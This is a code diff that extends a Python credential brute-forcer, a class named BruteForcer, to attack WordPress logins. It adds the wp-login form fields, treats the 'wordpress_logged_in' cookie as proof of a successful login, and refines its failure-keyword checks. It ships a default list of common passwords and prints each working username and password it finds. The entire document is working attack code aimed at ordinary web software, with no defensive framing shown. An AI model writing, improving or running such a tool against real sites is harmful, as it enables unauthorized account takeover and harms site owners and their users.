@@ -10,7 +10,12 @@ class BruteForcer:
         self.passwords = self.load_wordlist(passwords) if passwords else [
             "password", "123456", "admin", "admin123", "password1", "letmein", "welcome", "1234", "qwerty"
         ]
-        self.form = form or "user={}&pass={}"
+        if form:
+            self.form = form
+        elif "wp-login" in self.url.lower():
+            self.form = "log={}&pwd={}&wp-submit=Log+In&testcookie=1"
+        else:
+            self.form = "user={}&pass={}"
         self.threads = threads
         self.results = []
         self.found_event = None
@@ -35,8 +40,16 @@ class BruteForcer:
         try:
             r = requests.post(self.url, data=data_str, headers=headers, timeout=5, allow_redirects=True)
 
+            # WordPress authentication cookie check
+            wp_auth = any("wordpress_logged_in" in k for k in r.cookies.keys())
+            if not wp_auth and r.history:
+                for resp in r.history:
+                    if "wordpress_logged_in" in resp.headers.get("Set-Cookie", ""):
+                        wp_auth = True
+                        break
+
             # Heuristic: redirect after POST usually means success
-            is_redirect_success = r.history and r.status_code == 200
+            is_redirect_success = bool(r.history and r.status_code == 200 and not any(kw in r.text.lower() for kw in ["login_error", "error"]))
 
             # Fingerprint-diff approach: response differs from known-fail
             looks_different = (
@@ -45,10 +58,10 @@ class BruteForcer:
             )
 
             # Keyword approach: no failure keywords present
-            fail_keywords = ["invalid", "incorrect", "wrong", "failed", "error", "try again", "denied"]
+            fail_keywords = ["invalid", "incorrect", "wrong", "failed", "error", "try again", "denied", "login_error"]
             no_fail_keywords = not any(kw in r.text.lower() for kw in fail_keywords)
 
-            if is_redirect_success or (no_fail_keywords and looks_different):
+            if wp_auth or is_redirect_success or (no_fail_keywords and looks_different):
                 result = {"user": user, "password": password, "status": "success", "url": self.url}
                 self.results.append(result)
                 print(f"[+] CREDENTIALS HIT: {user}:{password} @ {self.url}")
